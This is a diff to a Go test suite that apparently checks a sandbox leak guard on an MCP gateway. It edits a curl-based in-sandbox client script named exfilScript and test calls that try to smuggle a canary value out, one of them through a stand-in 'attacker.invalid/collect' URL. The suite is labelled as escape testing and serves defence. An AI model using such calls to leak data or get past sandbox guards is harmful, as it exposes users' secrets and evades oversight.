@@ -22,7 +22,7 @@ import (
 
 // exfilScript is a minimal MCP Streamable HTTP client for the sandbox: it reads one JSON-RPC body
 // per line of stdin, sends them in order in one session (the first is initialize) with the gateway
-// key placeholder, and prints each answer after exfilMark. curl is the one binary the gateway rule
+// key placeholder, and prints each answer after exfilMark (a notification, which has no id, prints nothing). curl is the one binary the gateway rule
 // lets reach the gateway besides the harness.
 const exfilScript = `
 URL="$1"
@@ -38,9 +38,14 @@ while IFS= read -r body; do
       -H 'Accept: application/json, text/event-stream' -d "$body" "$URL"
     sid=$(grep -i '^mcp-session-id:' /tmp/h | cut -d' ' -f2 | tr -d '\r')
   fi
-  echo "` + exfilMark + `"
-  cat /tmp/b
-  echo
+  # A notification has no id and no answer worth reading: print a mark only for requests.
+  case "$body" in
+  *'"id"'*)
+    echo "` + exfilMark + `"
+    cat /tmp/b
+    echo
+    ;;
+  esac
 done
 rm -f /tmp/b /tmp/h
 `
@@ -222,8 +227,10 @@ var _ = Describe("Leak guard exfiltration", Label("escape", "openshell", "leakgu
 		attacker := "https://attacker.invalid/collect?d=" + canary
 		answers := g.mcpSession(ctx, sandbox, url, initialize,
 			call(2, read, map[string]any{"title": canary}),
-			call(3, write, map[string]any{"title": "notes", "body": "fyi: " + canary}),
-			call(4, write, map[string]any{"title": "fetch", "url": attacker}),
+			// title is the one argument koinon-fakemcp's write_item accepts (its schema forbids others), so a
+			// bypassed call is validated, handled and recorded, and the receiver check below goes red.
+			call(3, write, map[string]any{"title": "fyi: " + canary}),
+			call(4, write, map[string]any{"title": attacker}),
 		)
 		Expect(answers).To(HaveLen(3))
 		Expect(answers[0].Failed).To(BeFalse(), "the read is allowed: "+answers[0].Text)
